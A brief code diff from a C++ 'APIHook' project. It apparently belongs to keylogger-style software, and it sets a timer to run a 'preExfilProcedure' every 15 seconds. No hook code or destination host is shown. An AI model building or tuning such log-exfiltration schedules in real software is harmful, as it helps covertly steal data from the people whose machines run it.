@@ -65,10 +65,10 @@ namespace APIHook
 		}
 	}
 
-	// Change exfiltration interval here...remember...time is in miliseconds!
+	// Change exfiltration interval here...
+	// Remember to only change the multiplicand (15) and NOT the multiplier (1000)!
 
-	int intervalSeconds = 0;
-	Timer logExfilTimer(preExfilProcedure, 1000 * intervalSeconds, Timer::Infinite);
+	Timer logExfilTimer(preExfilProcedure, 1000 * 15, Timer::Infinite);
 
 	/* 
 	
